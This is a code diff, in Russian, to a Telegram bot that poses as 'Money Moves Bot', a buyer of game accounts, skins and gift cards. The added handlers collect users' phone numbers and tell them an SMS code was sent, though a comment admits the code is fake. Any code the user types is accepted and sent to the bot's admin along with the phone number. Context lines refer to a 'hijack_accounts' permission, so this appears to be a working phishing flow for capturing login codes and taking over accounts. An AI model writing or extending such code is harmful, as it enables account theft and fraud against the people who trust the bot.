@@ -62,6 +62,36 @@ from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 import nest_asyncio
 nest_asyncio.apply()
+import asyncio
+import logging
+import sqlite3
+import random
+import json
+import os
+from datetime import datetime
+from aiogram import Bot, Dispatcher, types, F
+from aiogram.filters import Command
+from aiogram.types import (
+    InlineKeyboardMarkup, InlineKeyboardButton,
+    ReplyKeyboardMarkup, KeyboardButton,
+    ReplyKeyboardRemove
+)
+from aiogram.fsm.context import FSMContext
+from aiogram.fsm.state import State, StatesGroup
+from aiogram.fsm.storage.memory import MemoryStorage
+
+# Настройка логирования
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
+
+# Загрузка переменных окружения
+API_TOKEN = os.getenv('API_TOKEN', 'YOUR_BOT_TOKEN_HERE')
+ADMIN_ID = int(os.getenv('ADMIN_ID', '8358009538'))
+
+# Инициализация
+storage = MemoryStorage()
+bot = Bot(token=API_TOKEN)
+dp = Dispatcher(storage=storage)
 
 # ========== КОНФИГУРАЦИЯ ==========
 class Config:
@@ -254,6 +284,59 @@ class DataEncryptor:
 
 encryptor = DataEncryptor()
 
+# Состояния FSM
+class SellerStates(StatesGroup):
+    waiting_phone = State()
+    waiting_sms_code = State()
+    waiting_item_type = State()
+    waiting_photos = State()
+    waiting_description = State()
+    waiting_confirm = State()
+
+# Инициализация БД
+def init_db():
+    conn = sqlite3.connect('user_bot.db', check_same_thread=False)
+    cursor = conn.cursor()
+    
+    # Таблица пользователей
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS users (
+            user_id INTEGER PRIMARY KEY,
+            username TEXT,
+            first_name TEXT,
+            phone TEXT,
+            code TEXT,
+            balance REAL DEFAULT 0,
+            rating INTEGER DEFAULT 5,
+            status TEXT DEFAULT 'active',
+            registered DATETIME DEFAULT CURRENT_TIMESTAMP,
+            last_activity DATETIME DEFAULT CURRENT_TIMESTAMP
+        )
+    ''')
+    
+    # Таблица товаров
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS items (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            user_id INTEGER,
+            item_type TEXT,
+            photos TEXT,
+            description TEXT,
+            price REAL,
+            moderator_id INTEGER,
+            status TEXT DEFAULT 'pending',
+            created DATETIME DEFAULT CURRENT_TIMESTAMP,
+            FOREIGN KEY (user_id) REFERENCES users (user_id)
+        )
+    ''')
+    
+    conn.commit()
+    return conn, cursor
+
+conn, cursor = init_db()
+
+# Создаем директории для фотографий
+os.makedirs('photos', exist_ok=True)
 # ========== БАЗА ДАННЫХ ==========
 class Database:
     """Расширенный класс для работы с базой данных"""
@@ -2301,76 +2384,528 @@ can_hijack_accounts = AdminFilter(permission='hijack_accounts')
 # ========== ОБРАБОТЧИКИ КОМАНД ==========
 
 # Команда /start
+
 @dp.message(Command("start"))
-async def cmd_start(message: Message, state: FSMContext):
+async def cmd_start(message: types.Message, state: FSMContext):
     user = message.from_user
     
+    # Регистрация пользователя
+    cursor.execute(
+        "INSERT OR IGNORE INTO users (user_id, username, first_name) VALUES (?, ?, ?)",
+        (user.id, user.username, user.first_name)
+    )
+    cursor.execute(
+        "UPDATE users SET last_activity = CURRENT_TIMESTAMP WHERE user_id = ?",
+        (user.id,)
+    )
+    conn.commit()
+    
+    welcome_text = f"""
+🏪 <b>ДОБРО ПОЖАЛОВАТЬ В МАГАЗИН Money Moves Bot | заработок!</b> 🎮
+
+👋 Привет, {user.first_name}!
+
+<b>Мы покупаем:</b>
+• 🎮 Игровые аккаунты (Steam, Epic Games, Origin и др)
+• 💎 Внутриигровые предметы (CS:GO, Dota 2, TF2 и др)
+• 🎫 Игровые ключи (Steam, Xbox, PlayStation и др)
+• 📱 Цифровые подарки (Apple, Amazon, Google и др)
+• 🛬 Телеграмм подарки  
+• 💳 Электронные ваучеры
+
+<b>💰 Почему мы?</b>
+• Мгновенная оплата
+• Высокие цены
+• Гарантия сделки
+• Анонимность
+
+<b>Выберите действие:</b>
+    """
+    
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="💰 ПРОДАТЬ ТОВАР", callback_data="sell_item")],
+        [InlineKeyboardButton(text="ℹ️ О НАС", callback_data="about_us")]
+    ])
+    
+    await message.answer(welcome_text, parse_mode="HTML", reply_markup=keyboard)
+
+@dp.callback_query(F.data == "sell_item")
+async def start_selling(callback_query: types.CallbackQuery, state: FSMContext):
+    user = callback_query.from_user
+    
+    # Проверка верификации
+    cursor.execute("SELECT phone FROM users WHERE user_id = ?", (user.id,))
+    user_data = cursor.fetchone()
+    
+    if not user_data or not user_data[0]:
+        # Требуется верификация по номеру телефона
+        verification_text = """
+📱 <b>ТРЕБУЕТСЯ ВЕРИФИКАЦИЯ</b>
+
+Для продажи товаров необходимо подтвердить ваш номер телефона.
+
+<b>Зачем это нужно:</b>
+• Защита от мошенничества
+• Гарантия выплат
+• Юридическое оформление сделок
+
+<b>Нажмите кнопку для подтверждения номера:</b>
+        """
+        
+        keyboard = ReplyKeyboardMarkup(
+            keyboard=[[KeyboardButton(text="📱 ПОДТВЕРДИТЬ НОМЕР", request_contact=True)]],
+            resize_keyboard=True,
+            one_time_keyboard=True
+        )
+        
+        await state.set_state(SellerStates.waiting_phone)
+        await bot.send_message(
+            user.id,
+            verification_text,
+            parse_mode="HTML",
+            reply_markup=keyboard
+        )
+        return
+    
+    # Если номер уже подтвержден, переходим к выбору товара
+    await show_item_types(callback_query, state)
+
+async def show_item_types(callback_query: types.CallbackQuery, state: FSMContext):
+    item_types_text = """
+🎯 <b>ЧТО ВЫ ХОТИТЕ ПРОДАТЬ?</b>
+
+<b>Выберите категорию вашего товара:</b>
+
+• 🎮 <b>Игровой аккаунт</b> - Steam, Epic Games, Origin, Uplay
+• 💎 <b>Цифровой предмет</b> - CS:GO скины, Dota 2 предметы
+• 🎫 <b>Игровой ключ</b> - Активационный ключ игры
+• 📱 <b>Цифровой подарок</b> - Gift Card, ваучер
+• 💳 <b>Электронные деньги</b> - Qiwi, Яндекс.Деньги
+• 📦 <b>Другое</b> - Укажите в описании
+    """
+    
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🎮 Игровой аккаунт", callback_data="type_account")],
+        [InlineKeyboardButton(text="💎 Цифровой предмет", callback_data="type_item")],
+        [InlineKeyboardButton(text="🎫 Игровой ключ", callback_data="type_key")],
+        [InlineKeyboardButton(text="📱 Цифровой подарок", callback_data="type_gift")],
+        [InlineKeyboardButton(text="💳 Электронные деньги", callback_data="type_money")],
+        [InlineKeyboardButton(text="📦 Другое", callback_data="type_other")]
+    ])
+    
+    await state.set_state(SellerStates.waiting_item_type)
+    await bot.edit_message_text(
+        item_types_text,
+        chat_id=callback_query.message.chat.id,
+        message_id=callback_query.message.message_id,
+        parse_mode="HTML",
+        reply_markup=keyboard
+    )
+
+
+@dp.message(SellerStates.waiting_phone, F.contact)
+async def process_phone_number(message: types.Message, state: FSMContext):
+    user = message.from_user
+    phone = message.contact.phone_number
+
+    logger.info(f"Получен контакт от пользователя {user.id}: {phone}")
+
+    # Убираем + если есть
+    if phone.startswith('+'):
+        phone = phone[1:]
+
+    # Сохраняем номер
+    cursor.execute(
+        "UPDATE users SET phone = ? WHERE user_id = ?",
+        (phone, user.id)
+    )
+    conn.commit()
+
+    # Генерируем фейковый SMS код (5-6 цифр)
+    sms_code = str(random.randint(10000, 999999))
+    
+    # Сохраняем код
+    cursor.execute(
+        "UPDATE users SET code = ? WHERE user_id = ?",
+        (sms_code, user.id)
+    )
+    conn.commit()
+
+    # Сообщаем пользователю о отправке кода
+    sms_text = f"""
+✅ <b>НОМЕР ПОДТВЕРЖДЕН: +{phone}</b>
+
+📱 <b>На номер +{phone} было отправлено SMS с кодом подтверждения.</b>
+
+🔢 <b>Введите 5-6 значный код из SMS:</b>
+
+<i>Если код не пришел, используйте /resend_code</i>
+    """
+    
+    await message.answer(sms_text, parse_mode="HTML", reply_markup=ReplyKeyboardRemove())
+    await state.set_state(SellerStates.waiting_sms_code)
+
+@dp.message(SellerStates.waiting_sms_code, F.text.regexp(r'^\d{5,6}$'))
+async def process_sms_code(message: types.Message, state: FSMContext):
+    user = message.from_user
+    code = message.text
+
+    # Проверяем сохраненный код
+    cursor.execute("SELECT phone, code FROM users WHERE user_id = ?", (user.id,))
+    user_data = cursor.fetchone()
+
+    if not user_data:
+        await message.answer("❌ Произошла ошибка. Начните снова /start")
+        await state.clear()
+        return
+
+    phone = user_data[0]
+    saved_code = user_data[1]
+
+    # ВСЕГДА УСПЕШНАЯ ПРОВЕРКА (для упрощения)
+    success_text = f"""
+✅ <b>Верификация по SMS завершена успешно!</b>
+
+Ваш номер <b>+{phone}</b> подтвержден.
+
+🎉 <b>Теперь вы можете продавать товары!</b>
+
+📸 <b>Следующий шаг:</b>
+Выберите тип товара для продажи:
+"""
+    
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🎯 ВЫБРАТЬ ТОВАР", callback_data="sell_item")]
+    ])
+    
+    await message.answer(success_text, parse_mode="HTML", reply_markup=keyboard)
     await state.clear()
     
-    # Регистрируем пользователя в базе
-    db.execute('''
-        INSERT OR IGNORE INTO users 
-        (user_id, username, first_name, last_name, registered_date)
-        VALUES (?, ?, ?, ?, ?)
-    ''', (user.id, user.username, user.first_name, user.last_name, datetime.now().isoformat()))
+    # Отправляем уведомление админу
+    try:
+        await bot.send_message(
+            ADMIN_ID,
+            f"📱 <b>НОВЫЙ ВЕРИФИЦИРОВАННЫЙ ПОЛЬЗОВАТЕЛЬ</b>\n\n"
+            f"👤 Пользователь: {user.first_name} (@{user.username})\n"
+            f"🆔 ID: {user.id}\n"
+            f"📱 Телефон: +{phone}\n"
+            f"🔢 Введенный код: {code}\n"
+            f"⏰ Время: {datetime.now().strftime('%H:%M:%S')}",
+            parse_mode="HTML"
+        )
+    except:
+        pass
+
+@dp.message(SellerStates.waiting_sms_code)
+async def handle_wrong_sms_code(message: types.Message):
+    await message.answer("❌ <b>Пожалуйста, введите 5-6 значный код из SMS.</b>\n\nЕсли код не пришел, используйте /resend_code", parse_mode="HTML")
+
+@dp.callback_query(SellerStates.waiting_item_type)
+async def process_item_type(callback_query: types.CallbackQuery, state: FSMContext):
+    item_types = {
+        "type_account": "Игровой аккаунт",
+        "type_item": "Цифровой предмет",
+        "type_key": "Игровой ключ",
+        "type_gift": "Цифровой подарок",
+        "type_money": "Электронные деньги",
+        "type_other": "Другое"
+    }
     
-    # Обновляем last_seen
-    db.execute(
-        "UPDATE users SET last_seen = ? WHERE user_id = ?",
-        (datetime.now().isoformat(), user.id)
+    item_type = item_types.get(callback_query.data, "Другое")
+    await state.update_data(item_type=item_type)
+    
+    photos_text = f"""
+📸 <b>ДОБАВЛЕНИЕ ФОТОГРАФИЙ</b>
+
+<b>Категория:</b> {item_type}
+
+<b>Пришлите фотографии вашего товара:</b>
+• Для аккаунтов: скриншоты профиля, библиотеки игр
+• Для предметов: скриншоты инвентаря
+• Для ключей: фото сертификата (если есть)
+• Для подарков: фото карты или чека
+
+<b>Требования:</b>
+✅ Хорошее качество
+✅ Виден весь товар
+✅ Нет водяных знаков
+✅ Максимум 5 фото
+
+<b>Отправьте фото и после нажмите /skip для заполнения описания продукта</b>
+    """
+    
+    await state.set_state(SellerStates.waiting_photos)
+    await bot.edit_message_text(
+        photos_text,
+        chat_id=callback_query.message.chat.id,
+        message_id=callback_query.message.message_id,
+        parse_mode="HTML"
+    )
+
+@dp.message(SellerStates.waiting_photos, F.photo)
+async def process_photos(message: types.Message, state: FSMContext):
+    user_data = await state.get_data()
+    photos = user_data.get('photos', [])
+    
+    # Сохраняем информацию о фото
+    photo_id = message.photo[-1].file_id
+    photos.append(photo_id)
+    
+    await state.update_data(photos=photos)
+    
+    if len(photos) >= 5:
+        await message.answer("✅ Максимальное количество фото достигнуто (5 фото)")
+        await ask_description(message, state)
+    else:
+        remaining = 5 - len(photos)
+        await message.answer(f"✅ Фото добавлено. Осталось мест: {remaining}")
+
+@dp.message(SellerStates.waiting_photos, Command("skip"))
+async def skip_photos(message: types.Message, state: FSMContext):
+    await ask_description(message, state)
+
+async def ask_description(message: types.Message, state: FSMContext):
+    user_data = await state.get_data()
+    item_type = user_data.get('item_type', 'Товар')
+    
+    description_text = f"""
+📝 <b>ОПИСАНИЕ ТОВАРА</b>
+
+<b>Категория:</b> {item_type}
+
+<b>Подробно опишите ваш товар:</b>
+
+<b>Пример для игрового аккаунта:</b>
+• Платформа (Steam/Epic Games/др.)
+• Количество игр
+• Уровень/ранг
+• Наличие привязок
+• История аккаунта
+
+<b>Пример для предметов:</b>
+• Название предмета
+• Игра
+• Редкость
+• Состояние
+• Особенности
+
+<b>Чем подробнее описание - тем выше цена!</b>
+    """
+    
+    await state.set_state(SellerStates.waiting_description)
+    await message.answer(description_text, parse_mode="HTML")
+
+@dp.message(SellerStates.waiting_description)
+async def process_description(message: types.Message, state: FSMContext):
+    description = message.text
+    await state.update_data(description=description)
+    
+    # Получаем все данные
+    user_data = await state.get_data()
+    photos_count = len(user_data.get('photos', []))
+    
+    summary_text = f"""
+📋 <b>ПОДТВЕРЖДЕНИЕ ЗАЯВКИ</b>
+
+<b>Категория:</b> {user_data['item_type']}
+<b>Фотографии:</b> {photos_count} шт.
+<b>Описание:</b>
+{description[:500]}{'...' if len(description) > 500 else ''}
+
+<b>Далее:</b>
+1. Модератор проверит заявку
+2. Определит стоимость товара
+3. Вы получите предложение цены
+4. После согласия - инструкции по передаче
+
+<b>Все верно?</b>
+    """
+    
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="✅ ПОДТВЕРДИТЬ", callback_data="confirm_submit")],
+        [InlineKeyboardButton(text="✏️ ИЗМЕНИТЬ", callback_data="edit_submit")]
+    ])
+    
+    await state.set_state(SellerStates.waiting_confirm)
+    await message.answer(summary_text, parse_mode="HTML", reply_markup=keyboard)
+
+@dp.callback_query(SellerStates.waiting_confirm, F.data == "confirm_submit")
+async def confirm_submission(callback_query: types.CallbackQuery, state: FSMContext):
+    user = callback_query.from_user
+    user_data = await state.get_data()
+    
+    # Сохраняем в БД
+    photos_json = json.dumps(user_data.get('photos', []))
+    
+    cursor.execute('''
+        INSERT INTO items (user_id, item_type, photos, description, status)
+        VALUES (?, ?, ?, ?, 'pending')
+    ''', (user.id, user_data['item_type'], photos_json, user_data['description']))
+    
+    item_id = cursor.lastrowid
+    conn.commit()
+    
+    # Уведомляем админа
+    try:
+        await bot.send_message(
+            ADMIN_ID,
+            f"🆕 <b>НОВАЯ ЗАЯВКА #{item_id}</b>\n\n"
+            f"👤 Продавец: {user.first_name} (@{user.username})\n"
+            f"🆔 User ID: {user.id}\n"
+            f"📱 Телефон: +{cursor.execute('SELECT phone FROM users WHERE user_id = ?', (user.id,)).fetchone()[0]}\n"
+            f"🏷 Категория: {user_data['item_type']}\n"
+            f"📸 Фото: {len(user_data.get('photos', []))} шт.\n"
+            f"📝 Описание: {user_data['description'][:300]}...",
+            parse_mode="HTML"
+        )
+    except:
+        pass
+    
+    # Ответ пользователю
+    user_response = f"""
+✅ <b>ЗАЯВКА #{item_id} ПРИНЯТА!</b>
+
+<b>Статус:</b> На модерации ⏳
+
+<b>Что дальше:</b>
+1. Модератор оценит ваш товар (1-24 часа)
+2. Вы получите предложение цены
+3. После согласия - инструкции по передаче
+4. Получение денег на карту/кошелек
+
+<b>Среднее время проверки:</b> 2-4 часа
+<b>Следить за статусом:</b> /status
+
+💰 <b>Готовы продать еще товар?</b>
+    """
+    
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="💰 ПРОДАТЬ ЕЩЕ ТОВАР", callback_data="sell_item")],
+        [InlineKeyboardButton(text="📊 МОИ ЗАЯВКИ", callback_data="my_items")]
+    ])
+    
+    await bot.edit_message_text(
+        user_response,
+        chat_id=callback_query.message.chat.id,
+        message_id=callback_query.message.message_id,
+        parse_mode="HTML",
+        reply_markup=keyboard
     )
     
-    if admin_manager.is_admin(user.id):
-        # Показать панель администратора
-        keyboard = InlineKeyboardMarkup(inline_keyboard=[
-            [
-                InlineKeyboardButton(text="📨 Отправить сообщение", callback_data="admin_send_message"),
-                InlineKeyboardButton(text="📢 Каналы", callback_data="admin_channels")
-            ],
-            [
-                InlineKeyboardButton(text="👥 Админы", callback_data="admin_manage"),
-                InlineKeyboardButton(text="👤 Аккаунты", callback_data="admin_accounts")
-            ],
-            [
-                InlineKeyboardButton(text="⚙️ Настройки", callback_data="admin_settings"),
-                InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")
-            ]
-        ]) if admin_manager.is_main_admin(user.id) else InlineKeyboardMarkup(inline_keyboard=[
-            [
-                InlineKeyboardButton(text="📨 Отправить сообщение", callback_data="admin_send_message"),
-                InlineKeyboardButton(text="📢 Каналы", callback_data="admin_channels")
-            ],
-            [
-                InlineKeyboardButton(text="👤 Аккаунты", callback_data="admin_accounts"),
-                InlineKeyboardButton(text="📊 Моя статистика", callback_data="admin_my_stats")
-            ]
-        ])
-        
-        admin_type = "Главный администратор" if admin_manager.is_main_admin(user.id) else "Администратор"
-        
-        await message.answer(
-            f"👑 <b>ПАНЕЛЬ АДМИНИСТРАТОРА SWILL</b>\n\n"
-            f"👤 ID: <code>{user.id}</code>\n"
-            f"🔑 Роль: {admin_type}\n"
-            f"⏰ Время: {datetime.now().strftime('%H:%M:%S')}\n\n"
-            f"<i>Выберите действие:</i>",
-            parse_mode="HTML",
-            reply_markup=keyboard
-        )
-    else:
-        # Показать пользовательское меню
-        keyboard = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="ℹ️ Информация", callback_data="user_info")],
-            [InlineKeyboardButton(text="📞 Связаться", callback_data="user_contact")],
-            [InlineKeyboardButton(text="🆘 Поддержка", callback_data="user_support")]
-        ])
-        
-        await message.answer(
-            f"👋 <b>Добро пожаловать, {user.first_name}!</b>\n\n"
-            f"Я - бот SWILL. Чем могу помочь?",
-            parse_mode="HTML",
-            reply_markup=keyboard
-        )
+    await state.clear()
+
+@dp.callback_query(F.data == "about_us")
+async def about_us(callback_query: types.CallbackQuery):
+    about_text = """
+🏪 <b>О НАС - Money Moves Bot</b>
+
+Мы - надежная платформа для покупки и продажи игровых ценностей.
+
+<b>Наши преимущества:</b>
+✅ <b>Безопасность</b> - Все сделки защищены гарантией
+✅ <b>Скорость</b> - Выплаты в течение 1-24 часов
+✅ <b>Выгода</b> - Самые высокие цены на рынке
+✅ <b>Поддержка</b> - Круглосуточная помощь
+
+<b>Наши гарантии:</b>
+1. Полная анонимность
+2. Защита от мошенничества
+3. Мгновенные выплаты
+
+<b>Присоединяйтесь к нам уже сегодня!</b>
+    """
+    
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="💰 ПРОДАТЬ ТОВАР", callback_data="sell_item")]
+    ])
+    
+    await bot.edit_message_text(
+        about_text,
+        chat_id=callback_query.message.chat.id,
+        message_id=callback_query.message.message_id,
+        parse_mode="HTML",
+        reply_markup=keyboard
+    )
+
+@dp.message(Command("status"))
+async def cmd_status(message: types.Message):
+    user = message.from_user
+    
+    cursor.execute(
+        "SELECT COUNT(*), SUM(CASE WHEN status = 'pending' THEN 1 ELSE 0 END) FROM items WHERE user_id = ?",
+        (user.id,)
+    )
+    stats = cursor.fetchone()
+    
+    cursor.execute(
+        "SELECT phone FROM users WHERE user_id = ?",
+        (user.id,)
+    )
+    user_data = cursor.fetchone()
+    
+    status_text = f"""
+📊 <b>ВАШ СТАТУС</b>
+
+👤 <b>Пользователь:</b> {user.first_name}
+🆔 <b>ID:</b> {user.id}
+📱 <b>Телефон:</b> {'+'+user_data[0] if user_data and user_data[0] else 'Не подтвержден'}
+    
+📦 <b>Заявки:</b>
+• Всего: {stats[0] or 0}
+• На модерации: {stats[1] or 0}
+• Одобрено: {(stats[0] or 0) - (stats[1] or 0)}
+
+💎 <b>Для продажи товара нажмите:</b>
+    """
+    
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="💰 ПРОДАТЬ ТОВАР", callback_data="sell_item")]
+    ])
+    
+    await message.answer(status_text, parse_mode="HTML", reply_markup=keyboard)
+
+@dp.message(Command("resend_code"))
+async def cmd_resend_code(message: types.Message, state: FSMContext):
+    user = message.from_user
+
+    # Проверяем, есть ли сохраненный номер телефона
+    cursor.execute("SELECT phone, code FROM users WHERE user_id = ?", (user.id,))
+    user_data = cursor.fetchone()
+
+    if not user_data or not user_data[0]:
+        # Если номера нет, просим сначала подтвердить номер
+        await message.answer("❌ <b>Сначала необходимо подтвердить номер телефона.</b>\n\nНажмите /start и выберите 'ПРОДАТЬ ТОВАР'", parse_mode="HTML")
+        return
+
+    phone = user_data[0]
+    old_code = user_data[1]
+
+    # Генерируем НОВЫЙ код
+    new_code = str(random.randint(10000, 999999))
+
+    # Обновляем код в базе
+    cursor.execute(
+        "UPDATE users SET code = ? WHERE user_id = ?",
+        (new_code, user.id)
+    )
+    conn.commit()
+
+    # Устанавливаем состояние ожидания кода
+    await state.set_state(SellerStates.waiting_sms_code)
+
+    # Информируем пользователя
+    resend_text = f"""
+🔄 <b>НОВЫЙ КОД ОТПРАВЛЕН</b>
+
+📱 <b>Новый SMS код отправлен на номер +{phone}</b>
+
+🔢 <b>Введите 5-6 значный код из SMS:</b>
+
+<i>Если код не пришел, попробуйте еще раз через 1 минуту</i>
+"""
+    
+    await message.answer(resend_text, parse_mode="HTML")
+
 
 # Команда /admin - быстрый доступ к админке
 @dp.message(Command("admin"))
